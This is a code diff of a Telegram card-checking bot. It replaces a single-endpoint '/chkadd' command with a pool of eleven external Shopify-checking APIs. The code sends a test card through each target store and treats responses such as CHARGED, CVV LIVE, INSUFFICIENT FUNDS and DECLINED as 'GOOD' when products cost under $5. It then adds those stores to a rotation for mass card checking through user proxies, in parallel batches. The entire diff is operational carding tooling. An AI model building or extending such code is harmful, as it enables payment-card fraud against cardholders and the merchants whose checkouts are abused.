@@ -11418,28 +11418,9 @@ def get_proxy_warning_message(user_id: int) -> str:
     working = [p for p in user_proxies if p not in failed_set]
     
     msg = (
-        "You need to add proxies before using \n\n"
-        "<b>Supported Formats:</b>\n"
-        "• <code>user:pass@ip:port</code>\n"
-        "• <code>user:pass:ip:port</code>\n"
-        "• <code>ip:port</code>\n"
-        "• <code>host:port:user:pass</code>\n\n"
-        f"1. Add proxies: <code>/massproxy proxy1 proxy2 proxy3 ...</code>\n"
-        f"2. Test proxies: <code>/pt</code>\n"
-        f"3. Start mass check\n\n"
+        f"  Reply to file \n"
+
     )
-    
-    if user_proxies:
-        msg += f"📊 <b>Your Proxy Status:</b>\n"
-        msg += f"   • Total: {len(user_proxies)}\n"
-        msg += f"   • Working: {len(working)}\n"
-        msg += f"   • Dead: {len(failed_set)}\n\n"
-        msg += f"💡 Run <code>/pt</code> to test your proxies.\n"
-    else:
-        msg += f"📊 <b>Your Proxy Status:</b> No proxies added yet.\n\n"
-        msg += f"💡 Add your first proxy: <code>/addmyproxy user:pass@ip:port</code>\n"
-    
-    msg += f"\n💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
     
     return msg
 
@@ -59293,15 +59274,422 @@ site_quality_tracker = SiteQualityTracker()
 
 
 
-# ============ CHKADD COMMAND - USING SPECIFIC API ONLY ============
+# ============ ENHANCED CHKADD WITH API POOL ============
+# Add this after your ShopifyAPIPool class
 
-# Specific API for chkadd
-CHKADD_API_URL = "https://sopi1ap-production-e537.up.railway.app/shopify"
+CHKADD_API_POOL = [
+    {
+        "name": "API 1",
+        "url": "https://bladesarksno1-production-8298.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 2",
+        "url": "https://bladesarksno1-production-6c0e.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 3",
+        "url": "https://sopi1ap-production-653f.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 4",
+        "url": "https://sopi1ap-production-4313.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 5",
+        "url": "https://bladesarksno1-production-2dc7.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 6",
+        "url": "https://bladesarksno1-production-96af.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 7",
+        "url": "https://sopi1ap-production-3dd6.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 8",
+        "url": "https://bladesarksno1-production-7048.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 9",
+        "url": "https://bladesarksno1-production-2083.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 10",
+        "url": "https://bladesarksno1-production-4a70.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+    {
+        "name": "API 11",
+        "url": "https://bladesarksno1-production-396d.up.railway.app/shopify",
+        "enabled": True,
+        "weight": 10,
+        "success_count": 0,
+        "fail_count": 0,
+        "avg_response_time": 0
+    },
+]
 
-async def chkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+class ChkaddAPIPoolManager:
     """
-    Check a site using the SPECIFIC Shopify API - ONLY uses the specified API.
-    Usage: /chkadd <site>
+    Manages the API pool for /chkadd command.
+    Each API checks one site at a time, running up to 13 sites in parallel.
+    """
+    
+    def __init__(self):
+        self.apis = CHKADD_API_POOL
+        self.api_stats = {}
+        self.current_index = 0
+        self._lock = asyncio.Lock()
+        self.session = None
+        
+        for api in self.apis:
+            self.api_stats[api["name"]] = {
+                "total_requests": 0,
+                "successful": 0,
+                "failed": 0,
+                "avg_response_time": 0,
+                "last_used": 0
+            }
+        
+        print(f"🔌 CHKADD API Pool initialized with {len(self.apis)} APIs")
+        for api in self.apis:
+            print(f"   • {api['name']}: {api['url']}")
+    
+    async def get_session(self):
+        if self.session is None or self.session.is_closed:
+            timeout = httpx.Timeout(45.0, connect=15.0, read=35.0)
+            self.session = httpx.AsyncClient(
+                timeout=timeout,
+                verify=False,
+                limits=httpx.Limits(max_keepalive_connections=20, max_connections=50),
+                http2=True
+            )
+        return self.session
+    
+    async def get_next_api(self) -> dict:
+        """Get next API in round-robin rotation"""
+        async with self._lock:
+            enabled_apis = [api for api in self.apis if api.get("enabled", True)]
+            
+            if not enabled_apis:
+                print("⚠️ All CHKADD APIs disabled! Re-enabling all...")
+                for api in self.apis:
+                    api["enabled"] = True
+                enabled_apis = self.apis
+            
+            if self.current_index >= len(enabled_apis):
+                self.current_index = 0
+            
+            selected = enabled_apis[self.current_index]
+            self.current_index += 1
+            
+            stats = self.api_stats.get(selected["name"], {})
+            success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
+            print(f"🔄 [CHKADD Pool] Selected: {selected['name']} (success: {success_rate:.0f}%)")
+            
+            return selected.copy()
+    
+    def mark_api_result(self, api_name: str, success: bool, response_time: float):
+        """Mark API call result"""
+        for api in self.apis:
+            if api["name"] == api_name:
+                if success:
+                    api["success_count"] = api.get("success_count", 0) + 1
+                    api["weight"] = min(20, api.get("weight", 1) + 1)
+                else:
+                    api["fail_count"] = api.get("fail_count", 0) + 1
+                    api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
+                
+                old_avg = api.get("avg_response_time", 0)
+                total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
+                if total_calls > 0:
+                    api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
+                break
+        
+        if api_name in self.api_stats:
+            self.api_stats[api_name]["total_requests"] += 1
+            if success:
+                self.api_stats[api_name]["successful"] += 1
+            else:
+                self.api_stats[api_name]["failed"] += 1
+    
+    async def check_site_with_api(self, site: str, api: dict, proxy: str = None) -> Tuple[bool, float, str, dict]:
+        """
+        Check a single site with a specific API
+        Returns: (is_good, price, response_text, data)
+        """
+        start_time = time.time()
+        
+        test_card = "4111111111111111|12|2028|123"
+        site_clean = site.replace('http://', '').replace('https://', '').split('/')[0].strip()
+        
+        print(f"🔍 [CHKADD] Testing {site_clean} with {api['name']}")
+        
+        try:
+            session = await self.get_session()
+            url = api["url"]
+            
+            params = {
+                "site": site_clean,
+                "cc": test_card
+            }
+            
+            if proxy:
+                proxy_url = format_proxy(proxy)
+                if proxy_url:
+                    params["proxy"] = proxy_url
+            
+            response = await session.get(url, params=params, timeout=30.0)
+            elapsed = time.time() - start_time
+            
+            print(f"📥 [CHKADD] {api['name']} -> {site_clean}: {response.status_code} ({elapsed:.2f}s)")
+            
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    response_text = data.get("Response", data.get("message", data.get("status", "UNKNOWN")))
+                    price = data.get("Price", data.get("price", 0))
+                    
+                    # Parse price
+                    try:
+                        if isinstance(price, str):
+                            price = float(price.replace('$', '').replace('USD', '').strip())
+                        else:
+                            price = float(price)
+                    except:
+                        price = 0
+                    
+                    response_upper = response_text.upper()
+                    
+                    # Check for GOOD responses (products under $5)
+                    GOOD_RESPONSES = [
+                        "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "PAID", "SUCCESS",
+                        "CAPTURED", "TRANSACTION_COMPLETED", "COMPLETED",
+                        "OTP_REQUIRED", "3D REQUIRED", "OTP", "3D", "SECURE", "AUTHENTICATION",
+                        "CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH",
+                        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS",
+                        "CARD_DECLINED", "DECLINED", "DO NOT HONOR",
+                        "RISK_DISALLOWED", "EXISTING_ACCOUNT_RESTRICTED",
+                        "APPROVED", "AUTHORIZED"
+                    ]
+                    
+                    BAD_RESPONSES = [
+                        "Site not supported", "Site Error! Status: 404", "Invalid site URL",
+                        "No products under", "No products under $10", "No valid products found",
+                        "SITE DEAD", "PROXY DEAD", "UNKNOWN GATEWAY", "GATEWAY UNKNOWN",
+                        "Connection error", "Timeout", "EMPTY_RESPONSE"
+                    ]
+                    
+                    is_bad = any(bad in response_upper for bad in BAD_RESPONSES)
+                    
+                    if is_bad:
+                        self.mark_api_result(api["name"], False, elapsed)
+                        return False, 0, response_text, data
+                    
+                    is_good = any(good in response_upper for good in GOOD_RESPONSES)
+                    
+                    if is_good and price > 0 and price < 5:
+                        self.mark_api_result(api["name"], True, elapsed)
+                        return True, price, response_text, data
+                    elif is_good and price >= 5:
+                        self.mark_api_result(api["name"], True, elapsed)
+                        return False, price, f"Price ${price:.2f} >= $5", data
+                    elif is_good:
+                        self.mark_api_result(api["name"], True, elapsed)
+                        return False, 0, "Good response but no price data", data
+                    
+                    self.mark_api_result(api["name"], True, elapsed)
+                    return False, 0, response_text[:100], data
+                    
+                except json.JSONDecodeError:
+                    self.mark_api_result(api["name"], False, elapsed)
+                    return False, 0, "Invalid JSON response", {}
+            else:
+                self.mark_api_result(api["name"], False, elapsed)
+                return False, 0, f"HTTP {response.status_code}", {}
+                
+        except httpx.TimeoutException:
+            self.mark_api_result(api["name"], False, 30.0)
+            return False, 0, "Timeout", {}
+        except Exception as e:
+            self.mark_api_result(api["name"], False, time.time() - start_time)
+            return False, 0, str(e)[:50], {}
+    
+    async def check_sites_parallel(self, sites: list, max_concurrent: int = 13, proxy: str = None) -> dict:
+        """
+        Check multiple sites in parallel using the API pool.
+        Each site gets a different API.
+        """
+        results = {
+            "good": [],
+            "bad": [],
+            "error": []
+        }
+        
+        if not sites:
+            return results
+        
+        # Clear API stats for fresh round
+        for api in self.apis:
+            api["success_count"] = 0
+            api["fail_count"] = 0
+        
+        # Use semaphore to limit concurrent requests
+        semaphore = asyncio.Semaphore(min(max_concurrent, len(self.apis)))
+        
+        async def process_site(site: str, idx: int):
+            async with semaphore:
+                # Get next API for this site
+                api = await self.get_next_api()
+                
+                is_good, price, response, data = await self.check_site_with_api(site, api, proxy)
+                
+                return {
+                    "site": site,
+                    "is_good": is_good,
+                    "price": price,
+                    "response": response,
+                    "data": data,
+                    "api_used": api["name"],
+                    "idx": idx
+                }
+        
+        # Create tasks for all sites
+        tasks = [process_site(site, idx) for idx, site in enumerate(sites)]
+        
+        # Process in parallel with timeout (90 seconds per site)
+        try:
+            async with asyncio.timeout(120):
+                completed = await asyncio.gather(*tasks, return_exceptions=True)
+        except asyncio.TimeoutError:
+            print("⚠️ CHKADD parallel check timed out")
+            completed = []
+        
+        # Sort results by original order
+        valid_results = []
+        for result in completed:
+            if isinstance(result, Exception):
+                continue
+            valid_results.append(result)
+        
+        valid_results.sort(key=lambda x: x.get("idx", 0))
+        
+        # Process results
+        for result in valid_results:
+            site = result["site"]
+            is_good = result["is_good"]
+            price = result["price"]
+            response = result["response"]
+            
+            if is_good:
+                results["good"].append({
+                    "site": site,
+                    "price": price,
+                    "response": response
+                })
+                print(f"✅ [CHKADD] GOOD: {site} (${price:.2f})")
+            else:
+                results["bad"].append({
+                    "site": site,
+                    "price": price,
+                    "response": response[:80]
+                })
+                print(f"❌ [CHKADD] BAD: {site} - {response[:50]}")
+        
+        return results
+    
+    def get_stats(self) -> str:
+        """Get formatted stats for all APIs"""
+        msg = "📊 <b>CHKADD API Pool Stats</b>\n\n"
+        
+        for api in self.apis:
+            name = api["name"]
+            stats = self.api_stats.get(name, {})
+            total = stats.get('total_requests', 0)
+            successful = stats.get('successful', 0)
+            success_rate = (successful / max(total, 1)) * 100
+            avg_time = stats.get('avg_response_time', 0)
+            enabled = "✅" if api.get("enabled", True) else "❌"
+            
+            msg += f"{enabled} <b>{name}</b>\n"
+            msg += f"   ├─ Requests: {total}\n"
+            msg += f"   ├─ Success Rate: {success_rate:.1f}%\n"
+            msg += f"   ├─ Avg Time: {avg_time:.2f}s\n"
+            msg += f"   └─ Weight: {api.get('weight', 1):.1f}\n\n"
+        
+        return msg
+    
+    async def close(self):
+        if self.session:
+            await self.session.aclose()
+            self.session = None
+
+
+# Create global instance
+chkadd_api_pool = ChkaddAPIPoolManager()
+
+
+
+
+
+# ============ UPDATED CHKADD COMMAND WITH API POOL ============
+
+async def chkadd_command_enhanced(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Enhanced CHKADD command using the API pool.
+    Checks multiple sites in parallel using 13 different APIs.
+    
+    Usage: /chkadd <site1> <site2> ... (up to 13 sites)
     Or reply to a .txt file with /chkadd
     """
     if not await verify_group_access(update, context):
@@ -59333,7 +59721,7 @@ async def chkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await message.reply_text("❌ No sites found in the file.")
                 return
             
-            await process_chkadd_sites_api(update, context, sites)
+            await process_chkadd_enhanced(update, context, sites)
             return
             
         except Exception as e:
@@ -59342,20 +59730,19 @@ async def chkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if not context.args:
         await message.reply_text(
-            "🔍 <b>CHKADD - Check Site for Products Under $5</b>\n\n"
-            "This command checks a site using the SPECIFIC Shopify API.\n\n"
+            "🚀 <b>CHKADD Enhanced - API Pool</b>\n\n"
+            "This command checks sites using 13 different APIs in parallel.\n\n"
             "<b>Usage:</b>\n"
-            "• <code>/chkadd &lt;site&gt;</code>\n"
+            "• <code>/chkadd &lt;site1&gt; &lt;site2&gt; ...</code>\n"
             "• Reply to a .txt file with <code>/chkadd</code>\n\n"
+            "<b>Features:</b>\n"
+            f"• {len(chkadd_api_pool.apis)} parallel API checks\n"
+            "• Each site gets a different API\n"
+            "• Auto-detects products under $5\n"
+            "• Auto-adds GOOD sites to rotation\n"
+            "• Weighted API rotation\n\n"
             "<b>Example:</b>\n"
-            "<code>/chkadd example.myshopify.com</code>\n\n"
-            "<b>API Used:</b>\n"
-            "<code>sopi1ap-production-e537.up.railway.app</code>\n\n"
-            "<b>What happens:</b>\n"
-            "✅ Tests ONLY the site you provide\n"
-            "✅ Checks if products are under $5\n"
-            "✅ Auto-adds GOOD sites to rotation\n"
-            "❌ Does NOT fall back to other sites",
+            "<code>/chkadd site1.com site2.com site3.com</code>",
             parse_mode=ParseMode.HTML,
             reply_markup=back_menu()
         )
@@ -59372,548 +59759,353 @@ async def chkadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await message.reply_text("❌ No valid sites found.")
         return
     
-    await process_chkadd_sites_api(update, context, sites)
+    # Limit to available APIs
+    max_sites = len(chkadd_api_pool.apis)
+    if len(sites) > max_sites:
+        await message.reply_text(
+            f"⚠️ You provided {len(sites)} sites but only {max_sites} APIs are available.\n"
+            f"Truncating to first {max_sites} sites."
+        )
+        sites = sites[:max_sites]
+    
+    await process_chkadd_enhanced(update, context, sites)
 
+# ============ CHKADD SITE PROCESSING FUNCTION ============
+
+# ============ CHKADD SITE PROCESSING FUNCTION - BATCH MODE ============
 
 async def process_chkadd_sites_api(update: Update, context: ContextTypes.DEFAULT_TYPE, sites: list):
     """
-    Process each site using the SPECIFIC Shopify API only.
-    ONLY marks as GOOD for valid responses: DECLINED, 3D REQUIRED, CHARGED, etc.
+    Process sites using the CHKADD API pool in BATCHES.
+    Each batch processes up to 11 sites in parallel, then moves to the next batch.
     """
     user_id = update.effective_user.id
     message = update.effective_message
     total_sites = len(sites)
     
     print(f"\n{'='*80}")
-    print(f"🚀 [CHKADD API] Testing {total_sites} site(s) using SPECIFIC API")
-    print(f"📍 API: {CHKADD_API_URL}")
+    print(f"🚀 [CHKADD SITES API] Processing {total_sites} sites in batches")
     print(f"{'='*80}")
     
-    results = {
-        "good": [],
-        "bad": [],
-        "error": [],
-        "already_good": [],
-        "already_in_rotation": []
-    }
+    if not sites:
+        await message.reply_text("❌ No sites to process.")
+        return
     
+    # Get available APIs count
+    BATCH_SIZE = len(chkadd_api_pool.apis)
+    total_batches = (total_sites + BATCH_SIZE - 1) // BATCH_SIZE
+    
+    print(f"📊 Batch size: {BATCH_SIZE}")
+    print(f"📊 Total batches: {total_batches}")
+    
+    # Initial progress message
     progress_msg = await message.reply_text(
-        f"🔍 <b>CHKADD - Checking Sites</b>\n\n"
-        f"📊 Total sites: {total_sites}\n"
-        f"📍 API: sopi1ap-production-e537\n"
-        f"🔄 Checking each site individually...\n\n"
-        f"<i>Please wait...</i>",
+        f"🚀 <b>CHKADD - Processing {total_sites} Sites</b>\n\n"
+        f"📦 Batch size: {BATCH_SIZE} sites per batch\n"
+        f"📊 Total batches: {total_batches}\n"
+        f"🔀 Using {BATCH_SIZE} parallel APIs\n"
+        f"🔄 Starting batch 1/{total_batches}...\n\n"
+        f"<i>This may take several minutes...</i>",
         parse_mode=ParseMode.HTML
     )
     
     start_time = time.time()
-    good_count = 0
     
-    # Test card
-    test_card = "4111111111111111|12|2028|123"
+    # Get proxy if allowed
+    proxy_str = None
+    if user_manager.can_use_proxy(user_id):
+        if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+            proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+            if proxy_list:
+                proxy_str = proxy_list[0]
     
-    # ============ VALID GOOD RESPONSES ============
-    GOOD_RESPONSES = [
-        # Charged/Success
-        "CHARGED", "ORDER COMPLETED", "ORDER_PLACED", "PAID", "SUCCESS",
-        "CAPTURED", "TRANSACTION_COMPLETED", "COMPLETED",
-        # 3D/OTP
-        "OTP_REQUIRED", "3D REQUIRED", "OTP", "3D", "SECURE", "AUTHENTICATION",
-        "3DS", "THREEDS",
-        # CVV Live
-        "CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH", "INVALID_SECURITY_CODE",
-        # Insufficient Funds
-        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS",
-        # Declined (card is valid)
-        "CARD_DECLINED", "DECLINED", "DO NOT HONOR",
-        # Other valid
-        "RISK_DISALLOWED", "EXISTING_ACCOUNT_RESTRICTED",
-        "APPROVED", "AUTHORIZED"
-    ]
+    # Statistics
+    all_good_sites = []
+    all_bad_sites = []
+    all_error_sites = []
+    added_count = 0
+    already_added = 0
+    batch_results = []
     
-    # ============ INVALID RESPONSES (NOT GOOD) ============
-    BAD_RESPONSES = [
-        "Site not supported",
-        "Site Error! Status: 404",
-        "Site Error! Status: 402",
-        "Site Error! Status: 403",
-        "Site Error! Status: 401",
-        "Site Error! Status: 500",
-        "No products under",
-        "No products under $10",
-        "No valid products found",
-        "Invalid site URL",
-        "Site requires login",
-        "Not Shopify!",
-        "Connection error",
-        "Timeout",
-        "SITE DEAD",
-        "PROXY DEAD",
-        "UNKNOWN GATEWAY",
-        "GATEWAY UNKNOWN",
-        "Payment method not available",
-        "INVALID_PAYMENT_METHOD",
-        "NO_SESSION_TOKEN",
-        "SITE ERROR",
-        "EMPTY_RESPONSE",
-        "INVALID_JSON",
-        "SERVER ERROR",
-        "BAD_GATEWAY",
-        "SERVICE_UNAVAILABLE"
-    ]
-    
-    for idx, site in enumerate(sites, 1):
-        site_clean = site.replace('http://', '').replace('https://', '').split('/')[0].strip()
+    # Process in batches
+    for batch_num in range(total_batches):
+        start_idx = batch_num * BATCH_SIZE
+        end_idx = min(start_idx + BATCH_SIZE, total_sites)
+        batch_sites = sites[start_idx:end_idx]
         
-        if not site_clean:
-            continue
+        print(f"\n{'='*60}")
+        print(f"📦 Processing Batch {batch_num + 1}/{total_batches} ({len(batch_sites)} sites)")
+        print(f"{'='*60}")
         
         # Update progress
         try:
             await progress_msg.edit_text(
-                f"🔍 <b>CHKADD - Checking Sites</b>\n\n"
-                f"📊 Progress: {idx}/{total_sites}\n"
-                f"🌟 GOOD found: {good_count}\n"
-                f"🔄 Currently checking: <code>{site_clean}</code>\n\n"
-                f"<i>Testing site...</i>",
+                f"🚀 <b>CHKADD - Processing {total_sites} Sites</b>\n\n"
+                f"📊 Progress: Batch {batch_num + 1}/{total_batches}\n"
+                f"✅ GOOD found: {len(all_good_sites)}\n"
+                f"➕ Added: {added_count}\n"
+                f"🔄 Checking {len(batch_sites)} sites...\n\n"
+                f"<i>This may take up to 60 seconds per batch...</i>",
                 parse_mode=ParseMode.HTML
             )
         except:
             pass
         
-        print(f"\n🔍 [CHKADD API] Testing site: {site_clean}")
-        print(f"🔍 [CHKADD API] Using specific API: {CHKADD_API_URL}")
-        
-        is_good = False
-        price = 0
-        response = ""
-        is_charged = False
-        response_type = "UNKNOWN"
-        
         try:
-            # Build URL with parameters
-            encoded_card = urllib.parse.quote(test_card)
-            encoded_site = urllib.parse.quote(site_clean)
+            # Run the parallel check for this batch
+            results = await chkadd_api_pool.check_sites_parallel(batch_sites, proxy=proxy_str)
             
-            api_url = f"{CHKADD_API_URL}?cc={encoded_card}&site={encoded_site}"
+            # Store results
+            good_sites = results.get("good", [])
+            bad_sites = results.get("bad", [])
+            error_sites = results.get("error", [])
             
-            print(f"📤 [CHKADD API] Request URL: {api_url[:100]}...")
+            all_good_sites.extend(good_sites)
+            all_bad_sites.extend(bad_sites)
+            all_error_sites.extend(error_sites)
             
-            start = time.time()
-            
-            async with httpx.AsyncClient(
-                timeout=httpx.Timeout(45.0, connect=15.0, read=35.0),
-                verify=False,
-                follow_redirects=True
-            ) as client:
-                response_raw = await client.get(
-                    api_url,
-                    headers={
-                        "User-Agent": generate_user_agent(),
-                        "Accept": "application/json"
-                    }
-                )
-            
-            elapsed = time.time() - start
-            print(f"📥 [CHKADD API] Response time: {elapsed:.2f}s")
-            print(f"📊 [CHKADD API] Status code: {response_raw.status_code}")
-            
-            if response_raw.status_code == 200:
-                try:
-                    data = response_raw.json()
-                    print(f"✅ [CHKADD API] Response: {json.dumps(data, indent=2)}")
-                    
-                    # Extract response data
-                    response = data.get("Response", data.get("message", data.get("status", "UNKNOWN")))
-                    price_raw = data.get("Price", data.get("price", data.get("amount", 0)))
-                    gateway = data.get("Gateway", data.get("gateway", "Shopify Payments"))
-                    status = data.get("Status", False)
-                    attempts = data.get("Attempts", 1)
-                    
-                    # Parse price
-                    try:
-                        if isinstance(price_raw, str):
-                            price = float(price_raw.replace('$', '').replace('USD', '').strip())
-                        else:
-                            price = float(price_raw)
-                    except:
-                        price = 0
-                    
-                    print(f"  📊 [{site_clean}] Response: {response[:50]}, Price: ${price:.2f}, Status: {status}")
-                    
-                    # ============ CHECK RESPONSE TYPE ============
-                    response_upper = response.upper()
-                    
-                    # Check if it's a BAD response (site not supported, errors, etc.)
-                    is_bad_response = False
-                    bad_match = None
-                    for bad in BAD_RESPONSES:
-                        if bad.upper() in response_upper:
-                            is_bad_response = True
-                            bad_match = bad
-                            break
-                    
-                    if is_bad_response:
-                        print(f"  ❌ [{site_clean}] BAD RESPONSE: {bad_match} - NOT GOOD")
-                        results["bad"].append({
-                            "site": site_clean,
-                            "price": price,
-                            "response": f"Bad response: {bad_match}",
-                            "reason": bad_match
-                        })
-                        continue
-                    
-                    # Check if it's a GOOD response
-                    is_good_response = False
-                    good_match = None
-                    for good in GOOD_RESPONSES:
-                        if good in response_upper:
-                            is_good_response = True
-                            good_match = good
-                            break
-                    
-                    if is_good_response and price > 0 and price < 5:
-                        # ============ VALID GOOD SITE ============
-                        is_good = True
-                        response_type = good_match
-                        print(f"  ✅ [{site_clean}] GOOD! Response: {good_match}, Price: ${price:.2f}")
-                        
-                        if "CHARGED" in response_upper or "ORDER_PLACED" in response_upper:
-                            is_charged = True
-                            print(f"  🔥 [{site_clean}] CHARGED/ORDER_PLACED!")
-                        
-                    elif is_good_response and price >= 5:
-                        print(f"  ⚠️ [{site_clean}] Good response but price ${price:.2f} is >= $5")
-                        results["bad"].append({
-                            "site": site_clean,
-                            "price": price,
-                            "response": f"Price ${price:.2f} >= $5",
-                            "reason": "Expensive"
-                        })
-                    
-                    elif is_good_response and price == 0:
-                        # Response is good but no price info
-                        if "CHARGED" in response_upper or "ORDER_PLACED" in response_upper:
-                            is_good = True
-                            is_charged = True
-                            price = 1.00
-                            print(f"  ✅ [{site_clean}] CHARGED! Site is GOOD (${price:.2f} estimated)")
-                        else:
-                            print(f"  ⚠️ [{site_clean}] Good response but no price info")
-                            results["bad"].append({
-                                "site": site_clean,
-                                "price": 0,
-                                "response": "Good response but no price",
-                                "reason": "No price"
-                            })
-                    
-                    else:
-                        print(f"  ❌ [{site_clean}] Unknown response: {response[:50]}")
-                        results["bad"].append({
-                            "site": site_clean,
-                            "price": price,
-                            "response": response[:80],
-                            "reason": "Unknown response"
-                        })
-                    
-                except json.JSONDecodeError as e:
-                    print(f"  ❌ [{site_clean}] JSON parse error: {e}")
-                    results["error"].append({
-                        "site": site_clean,
-                        "error": f"JSON parse error: {str(e)[:50]}"
-                    })
-                    continue
-            else:
-                print(f"  ❌ [{site_clean}] HTTP error: {response_raw.status_code}")
-                results["error"].append({
-                    "site": site_clean,
-                    "error": f"HTTP {response_raw.status_code}"
-                })
-                continue
+            # Process GOOD sites from this batch
+            for site_data in good_sites:
+                site = site_data["site"]
+                price = site_data["price"]
                 
-        except httpx.TimeoutException:
-            print(f"  ⏰ [{site_clean}] Timeout")
-            results["error"].append({
-                "site": site_clean,
-                "error": "Timeout"
-            })
-            continue
-        except Exception as e:
-            print(f"  ❌ [{site_clean}] Error: {str(e)[:50]}")
-            results["error"].append({
-                "site": site_clean,
-                "error": str(e)[:50]
-            })
-            continue
-        
-        # ============ PROCESS RESULT ============
-        if is_good:
-            # Check if already in rotation
-            if site_clean in autosopi_site_manager.sites:
-                results["already_in_rotation"].append(site_clean)
-                if site_quality_tracker.is_good_site(site_clean):
-                    results["already_good"].append(site_clean)
-                    good_count += 1
+                # Check if already in rotation
+                if site in autosopi_site_manager.sites:
+                    already_added += 1
                     continue
-            
-            # Add to rotation
-            if site_clean not in autosopi_site_manager.sites:
+                
+                # Add to rotation
                 user_name = update.effective_user.first_name or "Admin"
                 if update.effective_user.username:
                     user_name += f" (@{update.effective_user.username})"
                 
                 success, msg = autosopi_site_manager.add_site(
-                    site_clean,
+                    site,
                     user_id,
                     user_name,
                     bypass_pending=True
                 )
+                
                 if success:
-                    user_manager.increment_sites_added(user_id)
-                    print(f"✅ [CHKADD API] Added GOOD site: {site_clean} (${price:.2f}) - {response_type}")
-                else:
-                    print(f"⚠️ [CHKADD API] Failed to add site: {site_clean} - {msg}")
+                    site_quality_tracker.force_mark_good(site, price)
+                    added_count += 1
+                    print(f"✅ Added GOOD site: {site} (${price:.2f})")
             
-            # Mark as GOOD
-            site_quality_tracker.force_mark_good(site_clean, price)
-            results["good"].append({
-                "site": site_clean,
-                "price": price,
-                "response": response[:80],
-                "type": response_type,
-                "charged": is_charged
-            })
-            good_count += 1
-            print(f"🌟 [CHKADD API] GOOD site: {site_clean} (${price:.2f}) - {response_type}")
+            print(f"📊 Batch {batch_num + 1} complete: {len(good_sites)} GOOD, {len(bad_sites)} BAD, {len(error_sites)} ERRORS")
             
-        else:
-            # Already added to bad results above
-            pass
+        except Exception as e:
+            print(f"❌ Batch {batch_num + 1} error: {e}")
+            all_error_sites.extend([{"site": site, "error": str(e)[:50]} for site in batch_sites])
         
-        # Small delay between sites
-        await asyncio.sleep(0.5)
+        # Small delay between batches to avoid rate limiting
+        if batch_num < total_batches - 1:
+            await asyncio.sleep(1)
     
-    # Build final report
-    total_time = time.time() - start_time
-    minutes = int(total_time // 60)
-    seconds = int(total_time % 60)
+    elapsed = time.time() - start_time
+    minutes = int(elapsed // 60)
+    seconds = int(elapsed % 60)
     
-    response_msg = f"🔍 <b>CHKADD API - Scan Complete</b>\n\n"
-    response_msg += f"📊 <b>Summary:</b>\n"
-    response_msg += f"   ✅ GOOD sites: {len(results['good'])}\n"
-    response_msg += f"   ❌ Bad sites: {len(results['bad'])}\n"
-    response_msg += f"   ⚠️ Errors: {len(results['error'])}\n"
-    response_msg += f"   🔄 Already in rotation: {len(results['already_in_rotation'])}\n"
-    response_msg += f"   🌟 Already GOOD: {len(results['already_good'])}\n"
-    response_msg += f"   📝 Total checked: {total_sites}\n"
-    response_msg += f"   ⏱️ Time: {minutes}m {seconds}s\n"
-    response_msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
+    # Build final response
+    response = f"✅ <b>CHKADD Complete - All {total_sites} Sites Processed</b>\n\n"
+    response += f"📊 <b>Results:</b>\n"
+    response += f"   ✅ GOOD sites found: {len(all_good_sites)}\n"
+    response += f"   ❌ Bad sites: {len(all_bad_sites)}\n"
+    response += f"   ⚠️ Errors: {len(all_error_sites)}\n"
+    response += f"   📝 Total checked: {total_sites}\n"
+    response += f"   📦 Batches: {total_batches}\n"
+    response += f"   ⏱️ Time: {minutes}m {seconds}s\n"
+    response += f"━━━━━━━━━━━━━━━━━━━\n\n"
     
     # GOOD sites
-    if results["good"]:
-        response_msg += f"🌟 <b>GOOD Sites Added ({len(results['good'])}):</b>\n"
-        for item in results["good"][:10]:
-            charged_text = " 🔥" if item.get('charged') else ""
-            response_msg += f"   • <code>{item['site']}</code> - ${item['price']:.2f}{charged_text}\n"
-            response_msg += f"     📝 {item['type']}: {item['response'][:40]}\n"
-        if len(results["good"]) > 10:
-            response_msg += f"   ... and {len(results['good']) - 10} more\n"
-        response_msg += "\n"
+    if all_good_sites:
